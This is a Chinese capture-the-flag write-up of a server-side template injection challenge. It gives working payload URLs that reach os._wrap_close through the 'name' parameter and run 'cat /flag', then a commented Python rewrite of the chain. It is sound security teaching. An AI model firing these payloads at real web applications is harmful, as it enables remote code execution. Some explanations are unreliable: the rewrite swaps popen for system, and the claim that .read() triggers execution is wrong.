![[Pasted image 20260415134506.png]]
进入页面发现什么东西都没，打开检查器也一样。
我们开始尝试ssti的思路：
根据题目提示发现注入点是GET参数 `name` ，构造 `?name=1`
![[Pasted image 20260415134709.png]]
输入点被证实，尝试证实这个是ssti注入点
![[Pasted image 20260415141529.png]]
得证
构造 `http://4e53900d-c337-4e7f-bc34-d686e33a861b.challenge.ctf.show/?name={{%22%22.__class__.__mro__}}`，获取顶级父类(祖先)
![[Pasted image 20260415142131.png]]
构造 `http://4e53900d-c337-4e7f-bc34-d686e33a861b.challenge.ctf.show/?name={{%22%22.__class__.__mro__[1].__subclasses__()}}`，直接从最顶端获取所有子类和方法
![[Pasted image 20260415142314.png]]
开始寻找危险方法
![[Pasted image 20260415143438.png]]
找到一个 `os._wrap_close` ，尝试用其调用 `os`
![[Pasted image 20260415143631.png]]
确认其索引为134
构造 `http://4e53900d-c337-4e7f-bc34-d686e33a861b.challenge.ctf.show/?name={{%22%22.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__[%27popen%27](%27cat%20/flag%27).read()}}`
拿到flag。
> 其中 `__globals__["popen"]("cat /flag")` 整个是创建对象的过程， `.read()`才真正地执行了功能

---

## 末尾payload还原成正常python代码

```
# 第一步：拿到空字符串的类（<class 'str'>）
cls_str = "".__class__

# 第二步：拿到 MRO 列表（(str, object)）
mro_list = cls_str.__mro__

# 第三步：取 MRO 中第二个元素，即 object 类
obj_class = mro_list[1]  # 或者直接 object

# 第四步：拿到所有继承 object 的类（即当前所有类）
all_classes = obj_class.__subclasses__()

# 第五步：取第 135 个类（索引 134）。在不同 Python 版本里这个类不同，
# 常见的是 <class 'os._wrap_close'> 或某个拥有 __init__ 且 __globals__ 包含 os.system 的类。
target_class = all_classes[134]

# 第六步：调用该类的 __init__ 方法（注意是函数对象，不是调用）
init_func = target_class.__init__

# 第七步：获取 init 函数所在模块的全局变量字典
globals_dict = init_func.__globals__

# 第八步：从全局字典中取出 'system' 函数（它来自 os 模块）
system_func = globals_dict['system']

# 第九步：执行系统命令 cat /flag
system_func('cat /flag')
```